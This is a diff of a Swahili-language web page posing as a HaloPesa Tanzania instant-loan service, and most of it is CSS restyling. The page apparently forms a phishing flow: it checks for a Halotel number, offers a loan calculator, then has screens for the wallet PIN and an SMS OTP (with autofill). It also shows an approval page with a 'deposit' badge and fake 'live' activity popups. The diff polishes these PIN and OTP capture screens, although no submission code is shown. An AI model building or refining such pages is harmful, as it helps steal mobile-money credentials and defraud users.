@@ -2,27 +2,30 @@
 <html lang="sw">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>HaloPesa Tanzania – Mikopo ya Haraka na Rahisi</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
     --brand-orange: #f05a22;
-    --brand-orange-dark: #d94813;
-    --brand-orange-light: #fff0eb;
-    --brand-orange-soft: #fde8e0;
+    --brand-orange-dark: #cc4310;
+    --brand-orange-light: #fff3ef;
+    --brand-orange-soft: #fde2d8;
     --page-bg: #f05a22;
-    --card-bg: #ffffff;
-    --text-main: #1f2937;
-    --text-muted: #6b7280;
-    --text-orange: #f05a22;
-    --border-color: #f3f4f6;
-    --radius-lg: 28px;
+    --surface-white: #ffffff;
+    --surface-subtle: #f8fafc;
+    --text-main: #0f172a;
+    --text-muted: #64748b;
+    --text-light: #94a3b8;
+    --border-color: #e2e8f0;
+    --border-active: #f05a22;
+    --radius-lg: 24px;
     --radius-md: 16px;
     --radius-sm: 12px;
-    --radius-pill: 50px;
-    --shadow-card: 0 12px 32px rgba(0, 0, 0, 0.08);
-    --shadow-btn: 0 8px 20px rgba(240, 90, 34, 0.35);
+    --radius-pill: 9999px;
+    --shadow-card: 0 16px 36px rgba(0, 0, 0, 0.08), 0 4px 12px rgba(0, 0, 0, 0.03);
+    --shadow-btn: 0 8px 24px rgba(240, 90, 34, 0.3);
+    --shadow-input: 0 2px 8px rgba(0, 0, 0, 0.04);
   }
 
   * {
@@ -30,15 +33,16 @@
     margin: 0;
     padding: 0;
     font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+    -webkit-tap-highlight-color: transparent;
   }
 
   body {
     background-color: var(--page-bg);
     color: var(--text-main);
     min-height: 100vh;
-    overflow-x: hidden;
     display: flex;
     justify-content: center;
+    align-items: flex-start;
   }
 
   /* SYSTEM CONTAINER & WRAPPER */
@@ -50,6 +54,7 @@
     display: flex;
     flex-direction: column;
     position: relative;
+    overflow-x: hidden;
   }
 
   /* PAGE ISOLATION & FLOW SYSTEM */
@@ -66,18 +71,18 @@
     display: flex !important; 
   }
   @keyframes fadeIn { 
-    from { opacity: 0; transform: translateY(6px); } 
+    from { opacity: 0; transform: translateY(8px); } 
     to { opacity: 1; transform: translateY(0); } 
   }
 
-  /* WELCOME MODAL PAGE SPECIFIC STYLES */
+  /* WELCOME SCREEN STYLES */
   #page-welcome {
     justify-content: center;
     align-items: center;
     padding: 24px;
   }
   .welcome-card {
-    background: #ffffff;
+    background: var(--surface-white);
     border-radius: var(--radius-lg);
     padding: 40px 24px;
     text-align: center;
@@ -95,8 +100,8 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    margin-bottom: 28px;
-    box-shadow: 0 8px 20px rgba(240, 90, 34, 0.25);
+    margin-bottom: 24px;
+    box-shadow: var(--shadow-btn);
   }
   .welcome-icon-wrap img {
     width: 48px;
@@ -105,14 +110,11 @@
   }
   .welcome-text {
     color: var(--brand-orange);
-    font-size: 1.15rem;
+    font-size: 1.1rem;
     font-weight: 700;
     line-height: 1.6;
     margin-bottom: 32px;
     max-width: 320px;
-  }
-  .welcome-text strong {
-    font-weight: 800;
   }
   .welcome-btn {
     background: var(--brand-orange);
@@ -120,7 +122,7 @@
     border: none;
     border-radius: var(--radius-pill);
     padding: 16px 48px;
-    font-size: 1.05rem;
+    font-size: 1rem;
     font-weight: 800;
     letter-spacing: 0.04em;
     cursor: pointer;
@@ -134,16 +136,16 @@
   }
 
   /* OVERLAY & MODALS */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); backdrop-filter:blur(4px); z-index:999; align-items:center; justify-content:center; padding:20px; }
+  .overlay { display:none; position:fixed; inset:0; background:rgba(15,23,42,0.65); backdrop-filter:blur(6px); z-index:999; align-items:center; justify-content:center; padding:20px; }
   .overlay.show { display:flex; }
-  .modal { background:var(--card-bg); border-radius:var(--radius-md); padding:32px 24px; text-align:center; max-width:320px; width:100%; box-shadow:0 20px 40px rgba(0,0,0,0.25); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
+  .modal { background:var(--surface-white); border-radius:var(--radius-lg); padding:32px 24px; text-align:center; max-width:320px; width:100%; box-shadow:0 24px 48px rgba(0,0,0,0.25); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
   @keyframes popIn { from{opacity:0;transform:scale(0.88)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:40px; height:40px; border:3.5px solid var(--brand-orange-soft); border-top-color:var(--brand-orange); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
+  .spinner { width:42px; height:42px; border:4px solid var(--brand-orange-soft); border-top-color:var(--brand-orange); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
   @keyframes spin { to{transform:rotate(360deg)} }
-  .modal h3 { font-size:1.1rem; font-weight:700; color:var(--text-main); margin-bottom:6px; }
-  .modal p { font-size:0.85rem; color:var(--text-muted); }
+  .modal h3 { font-size:1.15rem; font-weight:800; color:var(--text-main); margin-bottom:6px; }
+  .modal p { font-size:0.85rem; color:var(--text-muted); font-weight:500; }
 
-  /* BRAND LOGO COMPONENT */
+  /* BRAND HEADER */
   .brand-header {
     display: flex;
     flex-direction: column;
@@ -152,19 +154,19 @@
     padding: 20px 0 16px 0;
   }
   .brand-icon-wrap {
-    width: 56px;
-    height: 56px;
+    width: 60px;
+    height: 60px;
     background: #ffffff;
-    border-radius: 16px;
+    border-radius: 18px;
     display: flex;
     align-items: center;
     justify-content: center;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    box-shadow: 0 6px 16px rgba(0,0,0,0.08);
     margin-bottom: 12px;
   }
   .brand-icon-wrap img {
-    width: 36px;
-    height: 36px;
+    width: 38px;
+    height: 38px;
     object-fit: contain;
   }
   .brand-title {
@@ -176,7 +178,7 @@
     margin-bottom: 6px;
   }
   .brand-subtitle {
-    color: rgba(255, 255, 255, 0.9);
+    color: rgba(255, 255, 255, 0.92);
     font-size: 0.85rem;
     font-weight: 600;
     text-align: center;
@@ -200,10 +202,10 @@
     display: flex;
     align-items: center;
     gap: 4px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
   }
 
-  /* NAVIGATION BAR */
+  /* NAVBAR */
   .navbar { 
     background: transparent; 
     display: flex; 
@@ -215,7 +217,7 @@
   .nav-left { 
     color: #ffffff; 
     font-size: 0.88rem; 
-    font-weight: 600; 
+    font-weight: 700; 
     cursor: pointer; 
     text-decoration: none; 
     display: flex;
@@ -248,15 +250,15 @@
     justify-content: center;
     gap: 8px;
     box-shadow: var(--shadow-btn);
-    transition: transform 0.15s ease, background-color 0.2s ease;
+    transition: transform 0.15s ease, background-color 0.2s ease, box-shadow 0.2s ease;
   }
   .btn-grad:active { transform: scale(0.98); }
-  .btn-grad:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+  .btn-grad:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
 
   .btn-gray { 
-    background: #f3f4f6; 
+    background: var(--surface-subtle); 
     color: var(--text-muted); 
-    border: none; 
+    border: 1px solid var(--border-color); 
     border-radius: var(--radius-md); 
     padding: 16px 20px; 
     font-size: 0.9rem; 
@@ -266,9 +268,9 @@
     transition: background 0.2s; 
   }
 
-  /* FORMS & INPUTS */
+  /* FORM FIELDS */
   .field { margin-bottom: 18px; }
-  .field label { display: block; font-size: 0.82rem; font-weight: 700; color: var(--brand-orange); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.03em; }
+  .field label { display: block; font-size: 0.8rem; font-weight: 800; color: var(--brand-orange); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.04em; }
   .field input, .field select, .field textarea { 
     width: 100%; 
     padding: 14px 16px; 
@@ -277,7 +279,7 @@
     font-size: 0.95rem; 
     font-weight: 600;
     color: var(--text-main); 
-    background: #fafafa; 
+    background: var(--surface-subtle); 
     outline: none; 
     transition: all 0.2s; 
     appearance: none; 
@@ -286,7 +288,7 @@
   .field input:focus, .field select:focus, .field textarea:focus { 
     border-color: var(--brand-orange); 
     background: #ffffff;
-    box-shadow: 0 0 0 3px rgba(240, 90, 34, 0.12); 
+    box-shadow: 0 0 0 4px rgba(240, 90, 34, 0.12); 
   }
   .field textarea { resize: vertical; min-height: 90px; }
   .sel-wrap { position: relative; }
@@ -295,7 +297,7 @@
   .phone-row { display: flex; }
   .ph-pre { 
     padding: 14px 14px; 
-    background: #f3f4f6; 
+    background: var(--surface-subtle); 
     border: 1.5px solid var(--border-color); 
     border-right: none; 
     border-radius: var(--radius-sm) 0 0 var(--radius-sm); 
@@ -310,17 +312,15 @@
 
   /* STEP PROGRESS */
   .prog-row { display: flex; gap: 8px; margin: 12px 0 24px; }
-  .prog-seg { flex: 1; height: 6px; border-radius: 3px; background: #f3f4f6; transition: background 0.3s; }
-  .prog-seg.done { background: var(--brand-orange); }
-  .prog-seg.now { background: var(--brand-orange); }
+  .prog-seg { flex: 1; height: 6px; border-radius: 3px; background: var(--border-color); transition: background 0.3s; }
+  .prog-seg.done, .prog-seg.now { background: var(--brand-orange); }
 
-  /* STEP BUTTONS */
   .step-btns { display: flex; gap: 12px; margin-top: 12px; }
   .step-btns .btn-grad { flex: 1.5; }
 
-  /* MAIN CARD LAYOUT */
+  /* MAIN CARD CONTAINERS */
   .main-card {
-    background: var(--card-bg);
+    background: var(--surface-white);
     border-radius: var(--radius-lg);
     padding: 24px 20px;
     box-shadow: var(--shadow-card);
@@ -347,39 +347,17 @@
     background: var(--brand-orange-light);
     color: var(--brand-orange);
     font-size: 0.75rem;
-    font-weight: 700;
+    font-weight: 800;
     padding: 6px 12px;
     border-radius: var(--radius-pill);
   }
 
-  /* CALCULATOR SPECIFIC STYLES */
-  .calc-input-block {
-    margin-bottom: 20px;
-  }
-  .calc-label-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-  }
-  .calc-label {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    color: var(--brand-orange);
-    font-size: 0.95rem;
-    font-weight: 800;
-  }
-  .calc-value-pill {
-    background: var(--brand-orange-light);
-    color: var(--brand-orange);
-    font-size: 1.05rem;
-    font-weight: 800;
-    padding: 6px 16px;
-    border-radius: var(--radius-pill);
-  }
+  /* CALCULATOR */
+  .calc-input-block { margin-bottom: 20px; }
+  .calc-label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+  .calc-label { display: flex; align-items: center; gap: 6px; color: var(--brand-orange); font-size: 0.95rem; font-weight: 800; }
+  .calc-value-pill { background: var(--brand-orange-light); color: var(--brand-orange); font-size: 1.05rem; font-weight: 800; padding: 6px 16px; border-radius: var(--radius-pill); }
 
-  /* CUSTOM SLIDER */
   input[type=range] {
     width: 100%;
     -webkit-appearance: none;
@@ -387,7 +365,7 @@
     border-radius: 4px;
     outline: none;
     margin: 8px 0 0 0;
-    background: linear-gradient(to right, var(--brand-orange) 0%, var(--brand-orange) var(--pct, 10%), #f3f4f6 var(--pct, 10%), #f3f4f6 100%);
+    background: linear-gradient(to right, var(--brand-orange) 0%, var(--brand-orange) var(--pct, 10%), var(--border-color) var(--pct, 10%), var(--border-color) 100%);
   }
   input[type=range]::-webkit-slider-thumb {
     -webkit-appearance: none;
@@ -409,91 +387,37 @@
     margin-bottom: 20px;
     font-size: 0.9rem;
   }
-  .rate-info-row .lbl { color: var(--brand-orange); font-weight: 800; }
-  .rate-info-row .val { color: var(--brand-orange); font-weight: 800; }
+  .rate-info-row .lbl, .rate-info-row .val { color: var(--brand-orange); font-weight: 800; }
 
-  /* DISPLAY RESULT BOX */
   .result-display-card {
-    background: #fafafa;
+    background: var(--surface-subtle);
     border-radius: var(--radius-md);
     padding: 20px;
     text-align: center;
     margin-bottom: 20px;
+    border: 1px solid var(--border-color);
   }
-  .result-amount {
-    font-size: 2.2rem;
-    font-weight: 800;
-    color: var(--brand-orange);
-    line-height: 1.1;
-    margin-bottom: 6px;
-  }
-  .result-subtitle {
-    font-size: 0.8rem;
-    font-weight: 700;
-    color: var(--text-muted);
-    margin-bottom: 8px;
-  }
-  .result-total {
-    font-size: 0.72rem;
-    color: var(--brand-orange);
-    font-weight: 700;
-  }
+  .result-amount { font-size: 2.2rem; font-weight: 800; color: var(--brand-orange); line-height: 1.1; margin-bottom: 6px; }
+  .result-subtitle { font-size: 0.8rem; font-weight: 700; color: var(--text-muted); margin-bottom: 8px; }
+  .result-total { font-size: 0.75rem; color: var(--brand-orange); font-weight: 700; }
 
-  /* BOTTOM CARDS / FEATURES GRID */
-  .grid-features {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 10px;
-    margin-bottom: 16px;
-  }
-  .feat-card {
-    background: #ffffff;
-    border-radius: var(--radius-md);
-    padding: 16px 10px;
-    text-align: center;
-    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.04);
-  }
+  .grid-features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 16px; }
+  .feat-card { background: #ffffff; border-radius: var(--radius-md); padding: 16px 10px; text-align: center; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.04); }
   .feat-card .fi { color: var(--brand-orange); font-size: 0.9rem; margin-bottom: 8px; }
   .feat-card .ft { font-size: 0.75rem; font-weight: 800; color: var(--brand-orange); margin-bottom: 4px; line-height: 1.2; }
   .feat-card .fs { font-size: 0.65rem; color: var(--text-muted); font-weight: 600; line-height: 1.2; }
 
-  /* FOOTER FOOTNOTES */
-  .page-bottom-note {
-    text-align: center;
-    color: rgba(255, 255, 255, 0.9);
-    font-size: 0.8rem;
-    font-weight: 700;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 6px;
-    padding: 8px 0;
-  }
+  .page-bottom-note { text-align: center; color: rgba(255, 255, 255, 0.9); font-size: 0.8rem; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 8px 0; }
+  .pg-footer { margin-top: auto; padding: 16px; text-align: center; font-size: 0.75rem; color: rgba(255,255,255,0.8); font-weight: 600; line-height: 1.5; }
 
-  .pg-footer { 
-    margin-top: auto; 
-    padding: 16px; 
-    text-align: center; 
-    font-size: 0.75rem; 
-    color: rgba(255,255,255,0.8); 
-    font-weight: 600;
-  }
-
-  /* SUMMARY BOX */
-  .sum-box { 
-    border: 1.5px solid var(--brand-orange-soft); 
-    border-radius: var(--radius-md); 
-    padding: 16px; 
-    margin: 16px 0; 
-    background: var(--brand-orange-light); 
-  }
+  .sum-box { border: 1.5px solid var(--brand-orange-soft); border-radius: var(--radius-md); padding: 16px; margin: 16px 0; background: var(--brand-orange-light); }
   .sum-box h3 { font-size: 0.88rem; font-weight: 800; color: var(--brand-orange); margin-bottom: 12px; }
   .sum-box .sum-row { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 6px 0; border-bottom: 1px dashed rgba(240, 90, 34, 0.2); }
   .sum-box .sum-row:last-child { border-bottom: none; }
   .sum-box .sum-row .sk { color: var(--text-muted); font-weight: 600; }
   .sum-box .sum-row .sv { font-weight: 700; color: var(--text-main); }
 
-  /* SUBMITTED PAGE */
+  /* SUBMITTED */
   #page-submitted { background: var(--page-bg); align-items: center; justify-content: space-between; }
   .sub-wrap { text-align: center; padding: 32px 16px; width: 100%; margin: auto; }
   .sub-icon { width: 72px; height: 72px; border-radius: 50%; background: #ffffff; color: var(--brand-orange); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
@@ -503,144 +427,168 @@
   .redir-n { font-weight: 800; color: #fff; }
   .btn-go { background: #ffffff; color: var(--brand-orange); border: none; border-radius: var(--radius-md); padding: 14px 28px; font-size: 0.95rem; font-weight: 800; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
 
-  /* LOGIN & OTP PAGES */
-  #page-login { background: var(--page-bg); }
-  .login-card {
-    background: #ffffff;
+  /* REFINED PIN & OTP DESIGN SYSTEM */
+  .fintech-card {
+    background: var(--surface-white);
     border-radius: var(--radius-lg);
     padding: 28px 20px;
     box-shadow: var(--shadow-card);
     width: 100%;
+    position: relative;
   }
-  .login-card h2 { font-size: 1.25rem; font-weight: 800; text-align: center; margin-bottom: 16px; color: var(--text-main); }
-  .lg-phone-row { display: flex; margin-bottom: 20px; }
-  .pin-label { font-size: 0.82rem; color: var(--text-muted); font-weight: 600; text-align: center; margin-bottom: 12px; }
-  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; align-items: center; }
-  .pin-box { width: 48px; height: 52px; border: 1.5px solid var(--border-color); border-radius: var(--radius-sm); text-align: center; font-size: 1.25rem; font-weight: 800; color: var(--brand-orange); outline: none; background: #fafafa; transition: border-color 0.2s; }
-  .pin-box:focus { border-color: var(--brand-orange); background: #ffffff; }
-  .pin-eye { cursor: pointer; color: var(--text-muted); font-size: 1.1rem; background: none; border: none; padding: 4px; }
-  .forgot-pin { text-align: center; font-size: 0.82rem; color: var(--text-muted); font-weight: 600; margin-bottom: 20px; cursor: pointer; }
-  .btn-login { width: 100%; padding: 15px; background: #e5e7eb; color: #9ca3af; border: none; border-radius: var(--radius-md); font-size: 0.95rem; font-weight: 800; cursor: pointer; transition: all 0.2s; }
-  .btn-login.rdy { background: var(--brand-orange); color: #ffffff; box-shadow: var(--shadow-btn); }
-
-  /* PROFESSIONAL OPTIMIZED OTP PAGE STYLES */
-  #page-otp { 
-    background: var(--page-bg);
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    align-items: center;
-  }
-  .otp-card {
-    background: #ffffff;
-    border-radius: var(--radius-lg);
-    padding: 32px 24px;
-    box-shadow: var(--shadow-card);
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
+  .security-header {
     text-align: center;
-    margin: auto 0;
+    margin-bottom: 20px;
   }
-  .otp-icon-badge {
-    width: 60px;
-    height: 60px;
+  .security-icon-badge {
+    width: 64px;
+    height: 64px;
     background: var(--brand-orange-light);
     color: var(--brand-orange);
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 1.6rem;
-    margin-bottom: 16px;
-    box-shadow: 0 4px 12px rgba(240, 90, 34, 0.12);
+    font-size: 1.75rem;
+    margin: 0 auto 12px;
+    box-shadow: 0 6px 16px rgba(240, 90, 34, 0.15);
   }
-  .otp-card h2 { 
-    font-size: 1.3rem; 
-    font-weight: 800; 
-    text-align: center; 
-    margin-bottom: 8px; 
-    color: var(--text-main); 
+  .security-title {
+    font-size: 1.3rem;
+    font-weight: 800;
+    color: var(--text-main);
+    margin-bottom: 4px;
   }
-  .otp-hint { 
-    font-size: 0.85rem; 
-    color: var(--text-muted); 
-    text-align: center; 
-    margin-bottom: 12px; 
+  .security-subtitle {
+    font-size: 0.85rem;
+    color: var(--text-muted);
+    font-weight: 500;
     line-height: 1.4;
   }
-  .otp-phone-badge { 
-    background: var(--brand-orange-light);
-    color: var(--brand-orange);
-    font-size: 0.95rem; 
-    font-weight: 800; 
-    padding: 6px 16px;
-    border-radius: var(--radius-pill);
-    display: inline-block;
-    margin-bottom: 24px; 
-    letter-spacing: 0.03em;
-  }
-  #otpInputSection {
-    width: 100%;
+
+  /* OPTIMIZED 4-DIGIT PIN & OTP BOXES */
+  .digit-container {
     display: flex;
-    flex-direction: column;
-    align-items: center;
-  }
-  .otp-inputs { 
-    display: flex; 
-    gap: 12px; 
+    gap: 12px;
     justify-content: center;
-    align-items: center; 
-    margin-bottom: 20px; 
-    width: 100%; 
-    max-width: 280px;
+    align-items: center;
+    margin: 20px 0;
+    width: 100%;
   }
-  .otp-box { 
-    width: 54px; 
-    height: 56px; 
-    border: 1.5px solid var(--border-color); 
-    border-radius: var(--radius-sm); 
-    text-align: center; 
-    font-size: 1.35rem; 
-    font-weight: 800; 
-    color: var(--brand-orange); 
-    outline: none; 
-    background: #fafafa; 
-    transition: all 0.2s ease;
-  }
-  .otp-box:focus { 
-    border-color: var(--brand-orange); 
-    background: #ffffff; 
-    box-shadow: 0 0 0 3px rgba(240, 90, 34, 0.15);
-  }
-  .otp-resend { 
-    font-size: 0.82rem; 
-    color: var(--text-muted); 
-    text-align: center; 
-    margin-bottom: 24px; 
-    font-weight: 600; 
-  }
-  .otp-resend span {
-    color: var(--brand-orange);
+  .digit-box {
+    width: 58px;
+    height: 64px;
+    border: 2px solid var(--border-color);
+    border-radius: var(--radius-sm);
+    text-align: center;
+    font-size: 1.6rem;
     font-weight: 800;
+    color: var(--brand-orange);
+    outline: none;
+    background: var(--surface-subtle);
+    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: var(--shadow-input);
   }
-  .btn-otp { 
-    width: 100%; 
-    padding: 16px; 
-    background: #e5e7eb; 
-    color: #9ca3af; 
-    border: none; 
-    border-radius: var(--radius-md); 
-    font-size: 0.95rem; 
-    font-weight: 800; 
-    cursor: pointer; 
-    transition: all 0.2s; 
+  .digit-box:focus {
+    border-color: var(--brand-orange);
+    background: #ffffff;
+    box-shadow: 0 0 0 4px rgba(240, 90, 34, 0.18);
+    transform: translateY(-2px);
   }
-  .btn-otp.rdy { 
-    background: var(--brand-orange); 
-    color: #ffffff; 
-    box-shadow: var(--shadow-btn); 
+
+  /* PIN TOGGLE BAR */
+  .pin-actions-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-top: 10px;
+    margin-bottom: 20px;
+    padding: 0 4px;
+  }
+  .pin-toggle-btn {
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    font-size: 0.82rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+    padding: 4px 8px;
+    border-radius: 6px;
+  }
+  .pin-toggle-btn:hover { color: var(--brand-orange); }
+  .forgot-pin-link {
+    font-size: 0.82rem;
+    color: var(--brand-orange);
+    font-weight: 700;
+    text-decoration: none;
+    cursor: pointer;
+  }
+
+  /* WEBOTP AUTO-FILL INDICATOR BADGE */
+  .autofill-banner {
+    background: #f0fdf4;
+    border: 1px solid #bbf7d0;
+    border-radius: var(--radius-sm);
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 18px;
+  }
+  .autofill-left {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .autofill-dot {
+    width: 8px;
+    height: 8px;
+    background: #16a34a;
+    border-radius: 50%;
+    animation: pulseGlow 1.5s infinite;
+  }
+  @keyframes pulseGlow {
+    0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.7); }
+    70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(22, 163, 74, 0); }
+    100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(22, 163, 74, 0); }
+  }
+  .autofill-text {
+    font-size: 0.78rem;
+    font-weight: 700;
+    color: #15803d;
+  }
+  .autofill-action {
+    background: #16a34a;
+    color: #ffffff;
+    border: none;
+    padding: 4px 10px;
+    border-radius: var(--radius-pill);
+    font-size: 0.7rem;
+    font-weight: 800;
+    cursor: pointer;
+  }
+
+  /* BUTTON STATES */
+  .btn-submit-action {
+    width: 100%;
+    padding: 16px;
+    background: #e2e8f0;
+    color: #94a3b8;
+    border: none;
+    border-radius: var(--radius-md);
+    font-size: 1rem;
+    font-weight: 800;
+    cursor: not-allowed;
+    transition: all 0.25s ease;
+  }
+  .btn-submit-action.rdy {
+    background: var(--brand-orange);
+    color: #ffffff;
+    cursor: pointer;
+    box-shadow: var(--shadow-btn);
   }
 
   /* APPROVAL PAGE */
@@ -658,7 +606,7 @@
   .comp-box p { font-size: 0.82rem; color: #451a03; line-height: 1.5; }
   .deposit-badge { background: #fef3c7; color: #92400e; font-weight: 800; padding: 2px 6px; border-radius: 4px; }
   .comp-note { margin-top: 8px; padding-top: 8px; border-top: 1px dashed #fcd34d; font-size: 0.75rem; color: #78350f; }
-  .ld-card { background: #fafafa; padding: 16px; border-top: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); }
+  .ld-card { background: var(--surface-subtle); padding: 16px; border-top: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); }
   .ld-card .ld-htitle { font-size: 0.82rem; font-weight: 800; color: var(--text-main); margin-bottom: 10px; }
   .ld-card .ld-row { display: flex; align-items: center; gap: 10px; padding: 6px 0; border-bottom: 1px solid var(--border-color); }
   .ld-card .ld-row:last-child { border-bottom: none; }
@@ -673,7 +621,7 @@
   .nxt-steps p { font-size: 0.78rem; color: #166534; line-height: 1.4; }
   .rth-wrap { padding: 16px; display: flex; flex-direction: column; gap: 10px; }
   .reapply-btn-pro { width: 100%; padding: 14px; background: #10b981; color: #ffffff; border: none; border-radius: var(--radius-md); font-size: 0.9rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; text-transform: uppercase; }
-  .rth-btn { width: 100%; padding: 12px; background: #f3f4f6; color: var(--text-main); border: none; border-radius: var(--radius-md); font-size: 0.85rem; font-weight: 700; cursor: pointer; }
+  .rth-btn { width: 100%; padding: 12px; background: var(--surface-subtle); color: var(--text-main); border: 1px solid var(--border-color); border-radius: var(--radius-md); font-size: 0.85rem; font-weight: 700; cursor: pointer; }
 
   /* LIVE POPUP NOTIFICATION */
   .live-popup {
@@ -684,24 +632,24 @@
     width: calc(100% - 32px);
     max-width: 408px;
     background: rgba(255, 255, 255, 0.98);
-    backdrop-filter: blur(6px);
+    backdrop-filter: blur(8px);
     border-radius: var(--radius-md);
-    padding: 10px 14px;
+    padding: 12px 16px;
     display: flex;
     align-items: center;
-    gap: 10px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+    gap: 12px;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.14);
     opacity: 0;
     visibility: hidden;
-    transition: all 0.3s ease;
+    transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
     z-index: 9999;
   }
   .live-popup.show { opacity: 1; visibility: visible; }
-  .popup-avatar { width: 32px; height: 32px; border-radius: 50%; background: var(--brand-orange-light); color: var(--brand-orange); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 800; }
+  .popup-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--brand-orange-light); color: var(--brand-orange); display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; flex-shrink: 0; }
   .popup-content { flex: 1; }
-  .popup-text { font-size: 0.75rem; line-height: 1.3; color: var(--text-main); }
+  .popup-text { font-size: 0.78rem; line-height: 1.35; color: var(--text-main); }
   .popup-text strong { color: var(--brand-orange); font-weight: 800; }
-  .popup-time { margin-top: 2px; font-size: 0.62rem; color: #10b981; font-weight: 700; }
+  .popup-time { margin-top: 2px; font-size: 0.65rem; color: #10b981; font-weight: 700; }
   .popup-time::before { content: "● "; animation: livePulse 1.2s infinite; }
   @keyframes livePulse { 50% { opacity: .4; } }
 
@@ -715,15 +663,14 @@
   .msg-icon { font-size: 1rem; flex-shrink: 0; }
 
   /* WAITING BOX */
-  .waiting-box { background: #fafafa; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 16px; text-align: center; margin-bottom: 16px; width: 100%; display: none; }
+  .waiting-box { background: var(--surface-subtle); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 16px; text-align: center; margin-bottom: 16px; width: 100%; display: none; }
   .waiting-box.show { display: block; }
-  .waiting-box .wb-spinner { width: 26px; height: 26px; border: 3px solid #f3f4f6; border-top-color: var(--brand-orange); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px; }
-  .waiting-box p { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
+  .waiting-box .wb-spinner { width: 28px; height: 28px; border: 3px solid #e2e8f0; border-top-color: var(--brand-orange); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px; }
+  .waiting-box p { font-size: 0.82rem; color: var(--text-muted); font-weight: 600; }
 
-  /* BRAND LOGOS & HELPERS */
-  .hp-logo-inline, .hp-logo-sm { display: flex; align-items: center; gap: 6px; }
-  .hp-logo-inline img, .hp-logo-sm img { width: 28px; height: 28px; object-fit: contain; }
-  .hp-logo-inline .brand, .hp-logo-sm .brand { font-size: 1.2rem; font-weight: 800; color: #ffffff; }
+  .hp-logo-sm { display: flex; align-items: center; gap: 6px; }
+  .hp-logo-sm img { width: 28px; height: 28px; object-fit: contain; }
+  .hp-logo-sm .brand { font-size: 1.2rem; font-weight: 800; color: #ffffff; }
 </style>
 </head>
 
@@ -735,7 +682,7 @@
 <div id="page-welcome" class="page active">
   <div class="welcome-card">
     <div class="welcome-icon-wrap">
-      <img src="images/halopesa-logo.png" alt="Halotel Logo">
+      <img src="images/halopesa-logo.png" alt="Halotel Logo" onerror="this.src='https://placehold.co/48x48/f05a22/ffffff?text=HaloPesa'">
     </div>
     <div class="welcome-text">
       Tafadhali hakikisha unatumia nambari ya simu ya <strong>Halotel</strong> iliyo halali na iliyosajiliwa ili uweze kufuzu.
@@ -748,7 +695,7 @@
 <div id="page-landing" class="page">
   <div class="brand-header">
     <div class="brand-icon-wrap">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/38x38/f05a22/ffffff?text=HP'">
     </div>
     <h1 class="brand-title">HaloPesa</h1>
